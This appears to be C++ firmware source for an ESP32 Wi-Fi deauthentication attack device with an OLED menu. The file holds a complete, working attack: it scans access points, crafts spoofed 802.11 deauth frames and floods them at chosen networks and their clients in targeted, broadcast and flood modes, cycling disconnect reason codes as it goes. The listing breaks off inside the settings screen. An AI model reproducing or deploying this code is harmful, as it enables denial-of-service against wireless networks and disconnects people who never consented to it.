#include "deauther.h"
#include "utils.h"
#include "icons.h"
#include "menu.h"
#include "config.h"
#include "pins.h"
#include <U8g2lib.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_now.h>
#include <esp_timer.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/queue.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// =================================================
// CONFIGURATION - REDUCED FOR MEMORY
// =================================================
#define DEAUTHER_MAX_NETWORKS 30
#define DEAUTHER_MAX_STATIONS 50
#define MAX_PACKETS_PER_SECOND 500
#define DEAUTH_CHAN_RETRY_DELAY_MS 10
#define DEAUTH_BURST_COUNT 15
#define REASON_CYCLE_INTERVAL_MS 500

// =================================================
// COMPACT STRUCTURES - SAVES MEMORY
// =================================================
typedef struct __attribute__((packed)) {
    uint8_t bssid[6];
    uint8_t ssid[25];
    int16_t rssi;
    uint8_t channel;
    uint8_t encryption;
    bool selected;
} ap_record_t;

typedef struct __attribute__((packed)) {
    uint8_t station_mac[6];
    uint8_t ap_bssid[6];
    uint8_t channel;
    int16_t rssi;
} station_record_t;

typedef struct {
    uint8_t frame_control[2] = { 0xC0, 0x00 };
    uint8_t duration[2];
    uint8_t station[6];
    uint8_t sender[6];
    uint8_t access_point[6];
    uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
    uint16_t reason;
} deauth_frame_t;

typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint16_t sequence_ctrl;
    uint8_t addr4[6];
} mac_hdr_t;

typedef struct {
    mac_hdr_t hdr;
    uint8_t payload[0];
} wifi_packet_t;

// =================================================
// GLOBALS - SCAN RESULTS (Optimized)
// =================================================
static ap_record_t scanned_aps[DEAUTHER_MAX_NETWORKS];
static station_record_t scanned_stations[DEAUTHER_MAX_STATIONS];
static int ap_count = 0;
static int station_count = 0;
static ap_record_t selected_ap;
static ap_record_t selected_aps[DEAUTHER_MAX_NETWORKS];
static int selected_ap_count = 0;
static station_record_t selected_station;
static bool station_selected = false;

// =================================================
// GLOBALS - ORIGINAL COMPATIBILITY
// =================================================
String deauthSSID[DEAUTHER_MAX_NETWORKS];
String deauthBSSID[DEAUTHER_MAX_NETWORKS];
int deauthChannels[DEAUTHER_MAX_NETWORKS];
int deauthRSSI[DEAUTHER_MAX_NETWORKS];
int deauthWifiCount = 0;
int deauthSelectedNetwork = 0;

deauth_frame_t deauth_frame;
int deauth_type = 0;
int deauth_eliminated = 0;
int deauth_curr_channel = 1;
bool deauth_active = false;
bool deauth_isScanning = false;
bool deauthExiting = false;
bool deauth_use_broadcast = false;
volatile bool deauth_processing = false;

// =================================================
// GLOBALS - UI STATE
// =================================================
enum DeauthScreen {
    DEAUTH_MAIN,
    DEAUTH_WIFI_LIST,
    DEAUTH_STATION_LIST,
    DEAUTH_DEAUTH,
    DEAUTH_STATUS,
    DEAUTH_SETTINGS,
    DEAUTH_MODE_SELECT,
    DEAUTH_REASON_SELECT
};

DeauthScreen deauth_currentScreen = DEAUTH_MAIN;
DeauthScreen deauth_lastScreen = DEAUTH_MAIN;
int deauth_cursor = 0;
int deauth_scrollTop = 0;
#define DEAUTH_VISIBLE_ITEMS 5

unsigned long lastButtonPressTime = 0;
const unsigned long DEBOUNCE_DELAY = 200;
unsigned long lastScreenUpdate = 0;
const unsigned long SCREEN_UPDATE_INTERVAL = 50;

// =================================================
// GLOBALS - ATTACK STATE (Minimized)
// =================================================
enum AttackMode {
    ATTACK_MODE_NORMAL,
    ATTACK_MODE_BROADCAST,
    ATTACK_MODE_FLOOD
};
AttackMode currentAttackMode = ATTACK_MODE_NORMAL;

static TaskHandle_t deauth_task_handle = NULL;
static volatile bool deauth_task_running = false;
static volatile bool deauth_stop_requested = false;
static uint32_t deauth_packets_sent = 0;

// =================================================
// GLOBALS - REASON CODES (Compact)
// =================================================
static const uint16_t reasonCodes[50] = {
    0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
    10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
    20, 21, 22, 23, 24, 25, 26, 27, 28, 29,
    30, 31, 32, 33, 34, 35, 36, 37, 38, 39,
    40, 41, 42, 43, 44, 45, 46, 47, 48, 49
};

static const char* const reasonShortDesc[50] = {
    "Reserved", "Unspec", "AuthInv", "Leaving", "Inactive",
    "APBusy", "Class2", "Class3", "Leaving", "NotAuth",
    "Power", "ChanChg", "BSS Trn", "InvElem", "MIC Fail",
    "4WayTO", "GrpKeyTO", "ElemDiff", "InvGrpCiph", "InvPairCiph",
    "InvAKMP", "UnsupRSNE", "InvRSNECap", "802.1X Fail", "CiphRej",
    "TDLS", "TDLS", "TDLS", "TDLS", "TDLS",
    "QoS", "QoS NoBW", "QoS Many", "QoS Range", "QoS TCLAS",
    "QoS TCLAS", "QoS Fail", "QoS Fail", "QoS Fail", "QoS Fail",
    "R40", "R41", "R42", "R43", "R44", "R45", "R46", "R47", "R48", "R49"
};

static int currentReasonIdx = 0;
static bool autoCycleRunning = false;
static unsigned long lastReasonChange = 0;
static const unsigned long REASON_CYCLE_INTERVAL = 500;

// =================================================
// FORWARD DECLARATIONS
// =================================================
void drawDeauthMenu(const char* title, const char* items[], int count);
void goDeauthScreen(DeauthScreen s);
void backDeauthScreen();
void scanDeauthNetworks();
void startDeauth(int wifi_number, int attack_type, uint16_t reason);
void stopDeauth();
void deauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type);
void sendDeauthPacket(const uint8_t* targetMac, const uint8_t* apMac, uint16_t reason);
void sendBroadcastDeauth(const uint8_t* apMac, uint16_t reason);
bool isDebouncedPress(int pin);
void showDeauthPopup(const char* message, int duration = 800);
void screenAttackMode();
void screenReasonSelect();
void screenDeauthTarget();
void screenDeauthSettings();
void screenDeauthMain();
void screenDeauthStatus();
void screenDeauthWifiList();

// =================================================
// DEAUTH PACKET TEMPLATES (Static Const)
// =================================================
static const uint8_t deauth_packet_template[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
};

// =================================================
// CHANNEL MANAGEMENT
// =================================================
static esp_err_t deauth_set_channel_robust(int channel) {
    if (channel < 1 || channel > 13) return ESP_ERR_INVALID_ARG;
    
    uint8_t cur_ch = 0;
    wifi_second_chan_t cur_sec = WIFI_SECOND_CHAN_NONE;
    
    if (esp_wifi_get_channel(&cur_ch, &cur_sec) == ESP_OK && cur_ch == (uint8_t)channel) {
        return ESP_OK;
    }
    
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err == ESP_OK) return ESP_OK;
    
    delay(DEAUTH_CHAN_RETRY_DELAY_MS);
    return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

// =================================================
// SEND DEAUTH PACKETS (Optimized)
// =================================================

void sendBroadcastDeauth(const uint8_t* apMac, uint16_t reason) {
    uint8_t deauth[26];
    memcpy(deauth, deauth_packet_template, sizeof(deauth_packet_template));
    
    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(&deauth[4], broadcast_mac, 6);
    memcpy(&deauth[10], apMac, 6);
    memcpy(&deauth[16], apMac, 6);
    
    uint16_t seq = (esp_random() & 0xFFF) << 4;
    deauth[22] = seq & 0xFF;
    deauth[23] = (seq >> 8) & 0xFF;
    deauth[24] = reason & 0xFF;
    deauth[25] = (reason >> 8) & 0xFF;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
    deauth_packets_sent++;
}

void sendDeauthPacket(const uint8_t* targetMac, const uint8_t* apMac, uint16_t reason) {
    uint8_t deauth[26];
    memcpy(deauth, deauth_packet_template, sizeof(deauth_packet_template));
    
    memcpy(&deauth[4], targetMac, 6);
    memcpy(&deauth[10], apMac, 6);
    memcpy(&deauth[16], apMac, 6);
    
    uint16_t seq = (esp_random() & 0xFFF) << 4;
    deauth[22] = seq & 0xFF;
    deauth[23] = (seq >> 8) & 0xFF;
    deauth[24] = reason & 0xFF;
    deauth[25] = (reason >> 8) & 0xFF;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(deauth), false);
    deauth_packets_sent++;
}

// =================================================
// SNIFFER CALLBACK
// =================================================

void IRAM_ATTR deauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (deauth_processing || !deauth_active) return;
    deauth_processing = true;
    
    const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
    const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
    const mac_hdr_t *mac_header = &packet->hdr;
    
    uint16_t packet_type = mac_header->frame_ctrl & 0x000C;
    
    if (packet_type == 0x0008 && deauth_active) {
        uint16_t currentReason = reasonCodes[currentReasonIdx];
        
        if (autoCycleRunning) {
            unsigned long now = millis();
            if (now - lastReasonChange > REASON_CYCLE_INTERVAL) {
                currentReasonIdx = (currentReasonIdx + 1) % 50;
                lastReasonChange = now;
                currentReason = reasonCodes[currentReasonIdx];
            }
        }
        
        for (int i = 0; i < ap_count; i++) {
            if (memcmp(mac_header->bssid, scanned_aps[i].bssid, 6) == 0) {
                if (deauth_type == 0 || deauth_type == 1) {
                    sendDeauthPacket(mac_header->src, mac_header->bssid, currentReason);
                    deauth_eliminated += 2;
                }
                if (deauth_type == 2) {
                    for (int j = 0; j < 3; j++) {
                        sendBroadcastDeauth(mac_header->bssid, currentReason);
                        deauth_eliminated++;
                    }
                }
                break;
            }
        }
    }
    
    deauth_processing = false;
}

// =================================================
// DEAUTH TASK
// =================================================
static void deauth_task(void *param) {
    deauth_task_running = true;
    deauth_stop_requested = false;
    
    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint32_t last_log = 0;
    
    while (!deauth_stop_requested) {
        uint16_t currentReason = reasonCodes[currentReasonIdx];
        
        if (autoCycleRunning) {
            unsigned long now = millis();
            if (now - lastReasonChange > REASON_CYCLE_INTERVAL) {
                currentReasonIdx = (currentReasonIdx + 1) % 50;
                lastReasonChange = now;
                currentReason = reasonCodes[currentReasonIdx];
            }
        }
        
        if (selected_ap_count > 0) {
            for (int sel_idx = 0; sel_idx < selected_ap_count; sel_idx++) {
                if (deauth_stop_requested) break;
                
                int channel = selected_aps[sel_idx].channel;
                deauth_set_channel_robust(channel);
                
                for (int burst = 0; burst < DEAUTH_BURST_COUNT; burst++) {
                    if (deauth_stop_requested) break;
                    sendBroadcastDeauth(selected_aps[sel_idx].bssid, currentReason);
                    deauth_eliminated++;
                }
                
                for (int i = 0; i < station_count; i++) {
                    if (deauth_stop_requested) break;
                    if (memcmp(scanned_stations[i].ap_bssid, selected_aps[sel_idx].bssid, 6) == 0) {
                        for (int burst = 0; burst < DEAUTH_BURST_COUNT; burst++) {
                            if (deauth_stop_requested) break;
                            sendDeauthPacket(scanned_stations[i].station_mac, 
                                            selected_aps[sel_idx].bssid, currentReason);
                            deauth_eliminated += 2;
                        }
                    }
                }
                delay(5);
            }
        } else if (selected_ap.bssid[0] != 0) {
            int channel = selected_ap.channel;
            if (channel < 1 || channel > 13) channel = 6;
            deauth_set_channel_robust(channel);
            
            for (int burst = 0; burst < DEAUTH_BURST_COUNT; burst++) {
                if (deauth_stop_requested) break;
                sendBroadcastDeauth(selected_ap.bssid, currentReason);
                deauth_eliminated++;
            }
            
            for (int i = 0; i < station_count; i++) {
                if (deauth_stop_requested) break;
                if (memcmp(scanned_stations[i].ap_bssid, selected_ap.bssid, 6) == 0) {
                    for (int burst = 0; burst < DEAUTH_BURST_COUNT; burst++) {
                        if (deauth_stop_requested) break;
                        sendDeauthPacket(scanned_stations[i].station_mac, 
                                        selected_ap.bssid, currentReason);
                        deauth_eliminated += 2;
                    }
                }
            }
        }
        
        uint32_t now = millis();
        if (now - last_log >= 5000) {
            Serial.printf("Deauth: %u pkts/sec, %u eliminated\n", 
                         deauth_packets_sent / 5, deauth_eliminated);
            deauth_packets_sent = 0;
            last_log = now;
        }
        
        delay(10);
    }
    
    deauth_task_running = false;
    deauth_stop_requested = false;
    deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

// =================================================
// POPUP FUNCTION - Using unified popup system
// =================================================

void showDeauthPopup(const char* message, int duration) {
    showPopupMessage("📡 Deauther", message);
    delay(duration);
}

// =================================================
// DEAUTH CONTROL
// =================================================

void startDeauth(int wifi_number, int attack_type, uint16_t reason) {
    if (deauth_task_running) {
        showPopupMessage("⚠️ Already Running!", "Stop first");
        delay(800);
        return;
    }
    
    deauth_eliminated = 0;
    deauth_packets_sent = 0;
    deauth_type = attack_type;
    deauth_frame.reason = reason;
    
    if (wifi_number < ap_count) {
        selected_ap = scanned_aps[wifi_number];
        selected_ap_count = 1;
        selected_aps[0] = selected_ap;
    }
    
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
    
    esp_wifi_stop();
    delay(50);
    esp_wifi_start();
    delay(50);
    
    BaseType_t rc = xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
    if (rc != pdPASS) {
        showPopupMessage("Task create fail!", "", "");
        delay(800);
        return;
    }
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(deauthSniffer);
    
    deauth_active = true;
    
    char targetStr[30];
    if (wifi_number < ap_count) {
        snprintf(targetStr, sizeof(targetStr), "Target: %s", deauthSSID[wifi_number].c_str());
    } else {
        snprintf(targetStr, sizeof(targetStr), "Target: All");
    }
    char modeStr[20];
    snprintf(modeStr, sizeof(modeStr), "Mode: %s", attack_type == 0 ? "Normal" : attack_type == 1 ? "Broadcast" : "Flood");
    showPopupMessage("🔴 Deauth Started!", targetStr, modeStr);
    delay(1000);
    goDeauthScreen(DEAUTH_STATUS);
}

void stopDeauth() {
    if (!deauth_active) {
        showPopupMessage("⚠️ Not Running!", "Nothing to stop");
        delay(800);
        return;
    }
    
    deauth_stop_requested = true;
    
    int wait_count = 0;
    while (deauth_task_handle != NULL && wait_count < 100) {
        delay(10);
        wait_count++;
    }
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    
    deauth_active = false;
    deauth_task_running = false;
    deauth_stop_requested = false;
    deauth_task_handle = NULL;
    deauth_type = 0;
    autoCycleRunning = false;
    
    showPopupMessage("⏹️ Deauth Stopped", "Attack ended");
    delay(1000);
}

// =================================================
// SCAN FUNCTIONS
// =================================================

void scanDeauthNetworks() {
    deauth_isScanning = true;
    
    u8g2.clearBuffer();
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 0, 128, 64);
    u8g2.setDrawColor(1);
    u8g2.setFont(u8g2_font_6x10_tr);
    CenteredStr(25, "Scanning...");
    CenteredStr(40, "Looking for networks");
    u8g2.sendBuffer();
    
    WiFi.scanDelete();
    int n = WiFi.scanNetworks();
    
    ap_count = 0;
    for (int i = 0; i < n && i < DEAUTHER_MAX_NETWORKS; i++) {
        wifi_auth_mode_t enc = WiFi.encryptionType(i);
        if (enc == WIFI_AUTH_OPEN || enc == WIFI_AUTH_WEP) continue;
        
        scanned_aps[ap_count].channel = WiFi.channel(i);
        scanned_aps[ap_count].rssi = WiFi.RSSI(i);
        scanned_aps[ap_count].encryption = enc;
        scanned_aps[ap_count].selected = false;
        
        uint8_t* bssid = WiFi.BSSID(i);
        memcpy(scanned_aps[ap_count].bssid, bssid, 6);
        
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) ssid = "Hidden";
        strncpy((char*)scanned_aps[ap_count].ssid, ssid.c_str(), 24);
        scanned_aps[ap_count].ssid[24] = '\0';
        
        deauthSSID[ap_count] = ssid;
        deauthBSSID[ap_count] = WiFi.BSSIDstr(i);
        deauthChannels[ap_count] = scanned_aps[ap_count].channel;
        deauthRSSI[ap_count] = scanned_aps[ap_count].rssi;
        
        ap_count++;
    }
    deauthWifiCount = ap_count;
    deauthSelectedNetwork = 0;
    
    // Simple station detection
    station_count = 0;
    esp_wifi_set_promiscuous(true);
    delay(1500);
    esp_wifi_set_promiscuous(false);
    
    deauth_isScanning = false;
    
    char msg[30];
    snprintf(msg, sizeof(msg), "Found %d APs", ap_count);
    showPopupMessage("✅ Scan Complete", msg);
    delay(800);
}

// =================================================
// BUTTON DEBOUNCE
// =================================================

bool isDebouncedPress(int pin) {
    if (millis() - lastButtonPressTime < DEBOUNCE_DELAY) return false;
    if (digitalRead(pin) == LOW) {
        lastButtonPressTime = millis();
        return true;
    }
    return false;
}

// =================================================
// UI HELPERS
// =================================================

void drawDeauthMenu(const char* title, const char* items[], int count) {
    u8g2.clearBuffer();
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 0, 128, 64);
    u8g2.setDrawColor(1);
    
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawBox(0, 0, 128, 12);
    u8g2.setDrawColor(0);
    u8g2.drawXBMP(2, 1, 10, 10, icon_wifi);
    u8g2.drawStr(15, 9, title);
    u8g2.setDrawColor(1);
    u8g2.drawLine(0, 12, 128, 12);
    
    if(deauth_cursor < deauth_scrollTop) deauth_scrollTop = deauth_cursor;
    if(deauth_cursor >= deauth_scrollTop + DEAUTH_VISIBLE_ITEMS) {
        deauth_scrollTop = deauth_cursor - DEAUTH_VISIBLE_ITEMS + 1;
    }
    
    for(int i = 0; i < DEAUTH_VISIBLE_ITEMS; i++) {
        int itemIndex = deauth_scrollTop + i;
        if(itemIndex >= count) break;
        int y = 16 + i * 9;
        
        u8g2.setDrawColor(0);
        u8g2.drawBox(0, y - 1, 128, 10);
        u8g2.setDrawColor(1);
        
        if(itemIndex == deauth_cursor) {
            u8g2.setDrawColor(0);
            u8g2.drawBox(0, y - 1, 128, 10);
            u8g2.setDrawColor(1);
            u8g2.setCursor(3, y + 1);
            u8g2.print(">");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[itemIndex]);
        } else {
            u8g2.setCursor(3, y + 1);
            u8g2.print(" ");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[itemIndex]);
        }
    }
    
    if(deauth_scrollTop > 0) {
        u8g2.setDrawColor(1);
        u8g2.setCursor(120, 15);
        u8g2.print("^");
    }
    if(deauth_scrollTop + DEAUTH_VISIBLE_ITEMS < count) {
        u8g2.setDrawColor(1);
        u8g2.setCursor(120, 60);
        u8g2.print("v");
    }
    
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 58, 128, 6);
    u8g2.setDrawColor(1);
    u8g2.setCursor(0, 63);
    u8g2.print(deauth_active ? "🔴 ACTIVE" : "⚪ IDLE");
    u8g2.setCursor(60, 63);
    u8g2.print("SEL:OK");
    u8g2.setCursor(100, 63);
    u8g2.print("BACK");
    
    u8g2.sendBuffer();
}

void goDeauthScreen(DeauthScreen s) {
    deauth_lastScreen = deauth_currentScreen;
    deauth_currentScreen = s;
    deauth_cursor = 0;
    deauth_scrollTop = 0;
    lastScreenUpdate = 0;
    u8g2.clearBuffer();
    u8g2.sendBuffer();
    delay(50);
}

void backDeauthScreen() {
    deauth_currentScreen = deauth_lastScreen;
    deauth_cursor = 0;
    deauth_scrollTop = 0;
    lastScreenUpdate = 0;
    u8g2.clearBuffer();
    u8g2.sendBuffer();
    delay(50);
}

// =================================================
// SCREEN: Reason Code Select
// =================================================

void screenReasonSelect() {
    const char* items[] = {
        "▶️ Auto-Cycle All",
        "⏹️ Stop Auto-Cycle",
        "Manual Select",
        "Back"
    };
    int count = 4;
    
    u8g2.clearBuffer();
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 0, 128, 64);
    u8g2.setDrawColor(1);
    
    u8g2.setFont(u8g2_font_6x10_tf);
    
    u8g2.drawBox(0, 0, 128, 12);
    u8g2.setDrawColor(0);
    u8g2.drawXBMP(2, 1, 10, 10, icon_wifi);
    u8g2.drawStr(15, 9, "Reason Codes");
    u8g2.setDrawColor(1);
    u8g2.drawLine(0, 12, 128, 12);
    
    u8g2.setCursor(2, 22);
    u8g2.print("Current: ");
    u8g2.print(reasonCodes[currentReasonIdx]);
    u8g2.print(" ");
    u8g2.print(reasonShortDesc[currentReasonIdx]);
    
    u8g2.setCursor(2, 32);
    u8g2.print("Auto-Cycle: ");
    u8g2.print(autoCycleRunning ? "🔴 ON" : "⚪ OFF");
    
    if (autoCycleRunning) {
        u8g2.setCursor(2, 40);
        u8g2.print("Changing every 500ms");
    }
    
    if(deauth_cursor < deauth_scrollTop) deauth_scrollTop = deauth_cursor;
    if(deauth_cursor >= deauth_scrollTop + DEAUTH_VISIBLE_ITEMS) {
        deauth_scrollTop = deauth_cursor - DEAUTH_VISIBLE_ITEMS + 1;
    }
    
    for(int i = 0; i < DEAUTH_VISIBLE_ITEMS; i++) {
        int itemIndex = deauth_scrollTop + i;
        if(itemIndex >= count) break;
        int y = 42 + i * 9;
        
        u8g2.setDrawColor(0);
        u8g2.drawBox(0, y - 1, 128, 10);
        u8g2.setDrawColor(1);
        
        if(itemIndex == deauth_cursor) {
            u8g2.setDrawColor(0);
            u8g2.drawBox(0, y - 1, 128, 10);
            u8g2.setDrawColor(1);
            u8g2.setCursor(3, y + 1);
            u8g2.print(">");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[itemIndex]);
        } else {
            u8g2.setCursor(3, y + 1);
            u8g2.print(" ");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[itemIndex]);
        }
    }
    
    u8g2.sendBuffer();
    
    if(isDebouncedPress(BTN_UP)) {
        deauth_cursor = (deauth_cursor - 1 + count) % count;
    }
    if(isDebouncedPress(BTN_DOWN)) {
        deauth_cursor = (deauth_cursor + 1) % count;
    }
    if(isDebouncedPress(BTN_SELECT)) {
        switch(deauth_cursor) {
            case 0:
                autoCycleRunning = true;
                lastReasonChange = millis();
                showPopupMessage("Auto-Cycle ON", "", "");
                delay(500);
                break;
            case 1:
                autoCycleRunning = false;
                showPopupMessage("Auto-Cycle OFF", "", "");
                delay(500);
                break;
            case 2:
                currentReasonIdx = (currentReasonIdx + 1) % 50;
                char msg[30];
                sprintf(msg, "Reason: %d", reasonCodes[currentReasonIdx]);
                showPopupMessage(msg, "", "");
                delay(400);
                break;
            case 3:
                goDeauthScreen(DEAUTH_MODE_SELECT);
                break;
        }
    }
    if(isDebouncedPress(BTN_BACK)) {
        goDeauthScreen(DEAUTH_MODE_SELECT);
    }
}

// =================================================
// SCREEN: Attack Mode
// =================================================

void screenAttackMode() {
    const char* items[] = {
        "🟢 Normal Mode",
        "🟡 Broadcast Mode", 
        "🔴 Flood Mode",
        "📋 Reason Codes",
        "Back"
    };
    int count = 5;
    
    u8g2.clearBuffer();
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 0, 128, 64);
    u8g2.setDrawColor(1);
    
    u8g2.setFont(u8g2_font_6x10_tf);
    
    u8g2.drawBox(0, 0, 128, 12);
    u8g2.setDrawColor(0);
    u8g2.drawXBMP(2, 1, 10, 10, icon_wifi);
    u8g2.drawStr(15, 9, "Attack Mode");
    u8g2.setDrawColor(1);
    u8g2.drawLine(0, 12, 128, 12);
    
    u8g2.setCursor(2, 22);
    u8g2.print("Mode: ");
    switch(currentAttackMode) {
        case ATTACK_MODE_NORMAL: u8g2.print("Normal"); break;
        case ATTACK_MODE_BROADCAST: u8g2.print("Broadcast"); break;
        case ATTACK_MODE_FLOOD: u8g2.print("Flood"); break;
        default: u8g2.print("Normal");
    }
    
    u8g2.setCursor(2, 32);
    u8g2.print("Reason: ");
    u8g2.print(reasonCodes[currentReasonIdx]);
    u8g2.print(" ");
    u8g2.print(reasonShortDesc[currentReasonIdx]);
    
    u8g2.setCursor(2, 40);
    u8g2.print(autoCycleRunning ? "🔄 Auto-Cycle ON" : "    Auto-Cycle OFF");
    
    if(deauth_cursor < deauth_scrollTop) deauth_scrollTop = deauth_cursor;
    if(deauth_cursor >= deauth_scrollTop + DEAUTH_VISIBLE_ITEMS) {
        deauth_scrollTop = deauth_cursor - DEAUTH_VISIBLE_ITEMS + 1;
    }
    
    for(int i = 0; i < DEAUTH_VISIBLE_ITEMS; i++) {
        int itemIndex = deauth_scrollTop + i;
        if(itemIndex >= count) break;
        int y = 42 + i * 9;
        
        u8g2.setDrawColor(0);
        u8g2.drawBox(0, y - 1, 128, 10);
        u8g2.setDrawColor(1);
        
        if(itemIndex == deauth_cursor) {
            u8g2.setDrawColor(0);
            u8g2.drawBox(0, y - 1, 128, 10);
            u8g2.setDrawColor(1);
            u8g2.setCursor(3, y + 1);
            u8g2.print(">");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[itemIndex]);
        } else {
            u8g2.setCursor(3, y + 1);
            u8g2.print(" ");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[itemIndex]);
        }
    }
    
    u8g2.sendBuffer();
    
    if(isDebouncedPress(BTN_UP)) {
        deauth_cursor = (deauth_cursor - 1 + count) % count;
    }
    if(isDebouncedPress(BTN_DOWN)) {
        deauth_cursor = (deauth_cursor + 1) % count;
    }
    if(isDebouncedPress(BTN_SELECT)) {
        switch(deauth_cursor) {
            case 0:
                currentAttackMode = ATTACK_MODE_NORMAL;
                deauth_type = 0;
                showPopupMessage("Normal Mode", "", "");
                delay(400);
                break;
            case 1:
                currentAttackMode = ATTACK_MODE_BROADCAST;
                deauth_type = 1;
                showPopupMessage("Broadcast Mode", "", "");
                delay(400);
                break;
            case 2:
                currentAttackMode = ATTACK_MODE_FLOOD;
                deauth_type = 2;
                showPopupMessage("Flood Mode", "", "");
                delay(400);
                break;
            case 3:
                goDeauthScreen(DEAUTH_REASON_SELECT);
                break;
            case 4:
                goDeauthScreen(DEAUTH_DEAUTH);
                break;
        }
    }
    if(isDebouncedPress(BTN_BACK)) {
        goDeauthScreen(DEAUTH_DEAUTH);
    }
}

// =================================================
// SCREEN: Deauth Target
// =================================================

void screenDeauthTarget() {
    if(deauthSelectedNetwork >= ap_count) {
        goDeauthScreen(DEAUTH_WIFI_LIST);
        return;
    }
    
    const char* items[] = {"Start Attack", "Attack Mode", "Back"};
    int count = 3;
    
    u8g2.clearBuffer();
    u8g2.setDrawColor(0);
    u8g2.drawBox(0, 0, 128, 64);
    u8g2.setDrawColor(1);
    
    u8g2.setFont(u8g2_font_6x10_tf);
    u8g2.drawBox(0, 0, 128, 12);
    u8g2.setDrawColor(0);
    u8g2.drawXBMP(2, 1, 10, 10, icon_wifi);
    u8g2.drawStr(15, 9, "Attack Target");
    u8g2.setDrawColor(1);
    u8g2.drawLine(0, 12, 128, 12);
    
    u8g2.setCursor(2, 22);
    String target = deauthSSID[deauthSelectedNetwork];
    if(target.length() > 16) target = target.substring(0, 14) + "..";
    u8g2.print("T: ");
    u8g2.print(target);
    
    u8g2.setCursor(2, 32);
    u8g2.print("CH:");
    u8g2.print(deauthChannels[deauthSelectedNetwork]);
    u8g2.print(" R:");
    u8g2.print(deauthRSSI[deauthSelectedNetwork]);
    u8g2.print("dB");
    
    u8g2.setCursor(2, 42);
    u8g2.print("Mode: ");
    switch(currentAttackMode) {
        case ATTACK_MODE_NORMAL: u8g2.print("Normal"); break;
        case ATTACK_MODE_BROADCAST: u8g2.print("Broadcast"); break;
        case ATTACK_MODE_FLOOD: u8g2.print("Flood"); break;
        default: u8g2.print("Normal");
    }
    
    u8g2.setCursor(2, 50);
    u8g2.print("Reason: ");
    u8g2.print(reasonCodes[currentReasonIdx]);
    u8g2.print(" ");
    u8g2.print(reasonShortDesc[currentReasonIdx]);
    
    if (autoCycleRunning) {
        u8g2.setCursor(2, 58);
        u8g2.print("🔄 Auto-Cycling...");
    }
    
    for(int i = 0; i < count; i++) {
        int y = 58 + i * 9;
        if(y > 63) break;
        
        u8g2.setDrawColor(0);
        u8g2.drawBox(0, y - 1, 128, 10);
        u8g2.setDrawColor(1);
        
        if(i == deauth_cursor) {
            u8g2.setDrawColor(0);
            u8g2.drawBox(0, y - 1, 128, 10);
            u8g2.setDrawColor(1);
            u8g2.setCursor(3, y + 1);
            u8g2.print(">");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[i]);
        } else {
            u8g2.setCursor(3, y + 1);
            u8g2.print(" ");
            u8g2.setCursor(12, y + 1);
            u8g2.print(items[i]);
        }
    }
    
    u8g2.sendBuffer();
    
    if(isDebouncedPress(BTN_UP)) {
        deauth_cursor = (deauth_cursor - 1 + count) % count;
    }
    if(isDebouncedPress(BTN_DOWN)) {
        deauth_cursor = (deauth_cursor + 1) % count;
    }
    if(isDebouncedPress(BTN_SELECT)) {
        if(deauth_cursor == 0) {
            int attackType = 0;
            switch(currentAttackMode) {
                case ATTACK_MODE_NORMAL: attackType = 0; break;
                case ATTACK_MODE_BROADCAST: attackType = 1; break;
                case ATTACK_MODE_FLOOD: attackType = 2; break;
                default: attackType = 0;
            }
            startDeauth(deauthSelectedNetwork, attackType, reasonCodes[currentReasonIdx]);
        } else if(deauth_cursor == 1) {
            goDeauthScreen(DEAUTH_MODE_SELECT);
        } else if(deauth_cursor == 2) {
            goDeauthScreen(DEAUTH_MAIN);
        }
    }
    if(isDebouncedPress(BTN_BACK)) {
        goDeauthScreen(DEAUTH_MAIN);
    }
}

// =================================================
// SCREEN: Settings
// =================================================

void screenDeauthSettings() {
    const char* items[] = {
        "SSID: " DEAUTHER_AP_SSID,
        "Pass: " DEAUTHER_AP_PASS,
        "Frames: Burst 15",
        "Rate Limit: 500/s",
        "Back"
    };
    int count = 5;

    drawDeauthMenu("Settings", items, count);
    
    if(isDebouncedPress(BTN_UP)) {
        deauth_cursor = (deauth_cursor - 1 + count) % count;
    }
